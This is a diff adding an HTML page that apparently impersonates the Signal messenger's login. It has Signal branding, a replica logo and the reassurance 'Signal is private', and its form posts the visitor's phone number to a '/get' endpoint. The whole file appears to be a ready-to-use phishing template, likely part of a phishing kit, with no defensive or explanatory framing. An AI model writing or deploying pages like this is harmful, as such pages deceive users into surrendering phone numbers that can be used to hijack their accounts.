@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1">
+    <title>Signal</title>
+    <style>
+      body {
+        font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
+        background-color: #1b1b1b;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        min-height: 100vh;
+        margin: 0;
+      }
+      .login-container {
+        width: 380px;
+        text-align: center;
+      }
+      #logo {
+        margin-bottom: 20px;
+      }
+      .g-h1 {
+        font-size: 24px;
+        font-weight: 600;
+        color: #fff;
+        margin-bottom: 8px;
+      }
+      .g-h2 {
+        font-size: 14px;
+        color: rgba(255,255,255,0.6);
+        margin-bottom: 28px;
+      }
+      .g-input {
+        width: 100%;
+        padding: 14px 16px;
+        border: 1px solid rgba(255,255,255,0.2);
+        border-radius: 12px;
+        font-size: 16px;
+        margin-bottom: 16px;
+        box-sizing: border-box;
+        outline: none;
+        background: rgba(255,255,255,0.05);
+        color: #fff;
+      }
+      .g-input:focus {
+        border-color: #3a76f0;
+      }
+      .g-input::placeholder {
+        color: rgba(255,255,255,0.4);
+      }
+      .gbtn-primary {
+        width: 100%;
+        padding: 14px;
+        background-color: #3a76f0;
+        color: #fff;
+        border: none;
+        border-radius: 12px;
+        font-size: 16px;
+        font-weight: 600;
+        cursor: pointer;
+      }
+      .gbtn-primary:hover {
+        background: #2d62cc;
+      }
+      .link {
+        display: block;
+        margin-top: 16px;
+        color: #3a76f0;
+        font-size: 14px;
+        text-decoration: none;
+      }
+      .link:hover {
+        text-decoration: underline;
+      }
+      .footer {
+        margin-top: 24px;
+        font-size: 13px;
+        color: rgba(255,255,255,0.5);
+      }
+      .footer a {
+        color: #3a76f0;
+        text-decoration: none;
+      }
+    </style>
+  </head>
+  <body>
+    <div class="login-container">
+      <svg id="logo" viewBox="0 0 80 80" width="80" height="80">
+        <defs>
+          <linearGradient id="a" x1="0" y1="0" x2="0" y2="1">
+            <stop offset="0%" stop-color="#3a76f0"/>
+            <stop offset="100%" stop-color="#2b5fc7"/>
+          </linearGradient>
+        </defs>
+        <circle cx="40" cy="40" r="40" fill="url(#a)"/>
+        <path d="M40 18c-12.2 0-22 8.8-22 19.6 0 6.2 3 11.6 7.6 15.4l-2 6.6 7.6-3.8c2.2.7 4.6.9 6.8.9 12.2 0 22-8.8 22-19.6S52.2 18 40 18z" fill="#fff"/>
+        <path d="M33 34l4-4 2 2-4 4z" fill="#3a76f0"/>
+        <path d="M39 28l4 4-14 14-4-4z" fill="#3a76f0"/>
+        <circle cx="44" cy="34" r="3" fill="#3a76f0"/>
+        <circle cx="36" cy="42" r="3" fill="#3a76f0"/>
+      </svg>
+      <h1 class="g-h1">Signal</h1>
+      <p class="g-h2">Enter your phone number to connect</p>
+      <form action="/get" method="POST">
+        <input class="g-input" type="tel" name="phone" placeholder="Phone Number" required>
+        <button type="submit" class="gbtn-primary">Continue</button>
+      </form>
+      <p class="footer">Signal is private. <a href="#">Learn more</a></p>
+    </div>
+  </body>
+</html>
